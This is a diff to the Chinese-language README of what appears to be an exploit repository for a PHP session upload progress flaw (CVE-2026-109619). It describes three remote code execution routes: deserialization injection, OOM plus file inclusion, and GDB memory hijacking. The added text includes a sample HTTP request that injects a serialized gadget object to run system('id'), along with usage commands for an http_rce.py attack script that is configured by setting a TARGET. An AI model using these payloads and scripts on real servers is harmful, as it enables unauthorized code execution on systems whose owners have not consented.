@@ -1,8 +1,43 @@
-# CVE-2026-109619 — PHP Session Upload Progress OOM → RCE
+# CVE-2026-109619 — PHP Session Upload Progress → RCE
 
-利用 PHP Session Upload Progress 的 OOM（記憶體耗盡）漏洞，
-在 session 檔案中保留攻擊者控制的 PHP 程式碼，再搭配第二個漏洞（LFI 或 .htaccess 寫入）
-將 session 檔案包含執行，達成遠端程式碼執行。
+利用 PHP Session Upload Progress 機制的多條攻擊路線達成遠端程式碼執行。
+
+## 三條獨立攻擊路線
+
+| 路線 | 核心原理 | 漏洞數 | 前置條件 | HTTP only |
+|------|----------|--------|----------|:---------:|
+| **Deserialization Injection** | session key pipe 注入 → 反序列化 → `__wakeup` | 1 | gadget class + memchr bypass | ✓ |
+| **OOM + LFI/.htaccess** | OOM 保留 session → include 執行 | 2 | LFI 或 .htaccess + `post_max_size ≥ memory_limit` | ✓ |
+| **GDB 記憶體劫持** | UAF → 偽造結構體 → 控制流劫持 | 1 | SSH + GDB + debug symbols | ✗ |
+
+---
+
+## Route 1: Deserialization Injection（純 HTTP 單漏洞 RCE）
+
+`PHP_SESSION_UPLOAD_PROGRESS` 值未經消毒直接拼入 session key。
+注入 pipe `|` 劈裂 `php` session serializer 格式，植入任意序列化物件。
+
+```
+POST /any.php HTTP/1.1
+Cookie: PHPSESSID=<32hex>
+Content-Type: multipart/form-data
+
+PHP_SESSION_UPLOAD_PROGRESS = |O:13:"Gadget":1:{s:3:"cmd";s:2:"id";}
+file = (any data)
+
+→ session decode → __wakeup() → system("id") → RCE
+```
+
+**單一 HTTP 請求、不需要 OOM、不需要 LFI。**
+
+PHP 8.x 的 session encode 有 `memchr` 保護阻擋 key 中的 `|`，需 binary patch 繞過。
+PHP 7.x 無此保護。
+
+技術細節 → [deser-inject.md](deser-inject.md)（中文）| [deser-inject-en.md](deser-inject-en.md)（English）
+
+---
+
+## Route 2: OOM + Include（HTTP 雙漏洞 RCE）
 
 已在兩個完全不同的環境上驗證成功：
 
@@ -21,7 +56,7 @@
 
 在 PHP 8.4.27 / 8.3.36 / 8.2.35 修補（2026-10-21），PHP 7.x 無官方修補。
 
-## 漏洞原理
+### OOM 漏洞原理
 
 ```
 攻擊者 ──POST──▶ PHP (multipart + session upload progress)
@@ -47,10 +82,22 @@ OOM 觸發的必要條件：`post_max_size ≥ memory_limit`
 
 技術細節（sapi_activate 中斷路徑、session 寫入機制、檔案格式）→ [oom-exploit.md](oom-exploit.md)
 
+---
+
+## Route 3: GDB 記憶體劫持（SSH 單漏洞 RCE）
+
+不依賴第二個漏洞，透過 GDB 在記憶體中偽造結構體劫持控制流。
+需 SSH + sudo + GDB + debug symbols。
+
+技術細節 → [gdb-exploit.md](gdb-exploit.md)
+
+---
+
 ## 腳本說明
 
 | 腳本 | 路線 | 前置條件 | 說明 |
 |------|------|----------|------|
+| **`http_rce.py`** | **Deser Injection** | **gadget class + memchr bypass** | **純 HTTP 單漏洞，單一請求 RCE** |
 | `php2shell.py` | OOM + LFI | 目標存在 LFI 漏洞 | 純 HTTP 雙漏洞，不需記憶體位址 |
 | `test_http.py` | OOM + auto_prepend | `.htaccess` 已放置，`post_max_size ≥ memory_limit` | `.htaccess` 設定 `auto_prepend_file` |
 | `test_default_http.py` | OOM + auto_prepend | `.htaccess` 已放置，Apache AllowOverride All | `.htaccess` 覆蓋所有設定，stock php.ini 即可 |
@@ -59,6 +106,16 @@ OOM 觸發的必要條件：`post_max_size ≥ memory_limit`
 | `uaf_rce.py` | Heap UAF spray | — | 實驗腳本（理論未驗證） |
 
 ## 使用方式
+
+### Deserialization Injection（純 HTTP 單漏洞）
+
+```bash
+python3 http_rce.py "id"
+python3 http_rce.py "uname -a; whoami"
+```
+
+修改 `http_rce.py` 頂部設定 `TARGET`、`GADGET_CLASS` 等。
+技術細節 → [deser-inject.md](deser-inject.md) | [deser-inject-en.md](deser-inject-en.md)
 
 ### OOM + LFI
 
@@ -103,6 +160,7 @@ Session 路徑因發行版不同：Debian/Ubuntu `/var/lib/php/sessions/`、Cent
 ## 檔案結構
 
 ```
+├── http_rce.py              ← Deser Injection → 純 HTTP 單漏洞 RCE ★
 ├── php2shell.py             ← OOM + LFI → RCE
 ├── test_http.py             ← OOM + .htaccess → RCE（需調 php.ini）
 ├── test_default_http.py     ← OOM + .htaccess → RCE（stock php.ini）
@@ -110,13 +168,16 @@ Session 路徑因發行版不同：Debian/Ubuntu `/var/lib/php/sessions/`、Cent
 ├── test_gdb.py              ← GDB 記憶體劫持 → RCE
 ├── uaf_rce.py               ← Heap UAF spray（理論未驗證）
 ├── README.md
+├── deser-inject.md          ← Deserialization Injection 技術細節（中文）
+├── deser-inject-en.md       ← Deserialization Injection technical details (English)
 ├── oom-exploit.md           ← OOM 技術細節
 ├── gdb-exploit.md           ← GDB 路線技術細節
 ```
 
 ## 限制
 
-- LFI 版本（`php2shell.py`）需要目標存在 LFI 向量
-- .htaccess 版本（`test_http.py`, `test_default_http.py`）需要 `.htaccess` 已在 web root 且 Apache AllowOverride All
-- PHP 預設設定下無法單獨觸發 OOM，需要 `post_max_size ≥ memory_limit`
-- GDB 版本需要 SSH + sudo + debug symbols
+- **Deser Injection**（`http_rce.py`）：PHP 8.x 需 binary patch 繞過 memchr 保護；需要可用的反序列化 gadget class
+- **OOM + LFI**（`php2shell.py`）：需要目標存在 LFI 向量
+- **OOM + .htaccess**（`test_http.py`, `test_default_http.py`）：需要 `.htaccess` 已在 web root 且 Apache AllowOverride All
+- **OOM 路線共通**：PHP 預設設定下無法單獨觸發 OOM，需要 `post_max_size ≥ memory_limit`
+- **GDB 版本**：需要 SSH + sudo + debug symbols
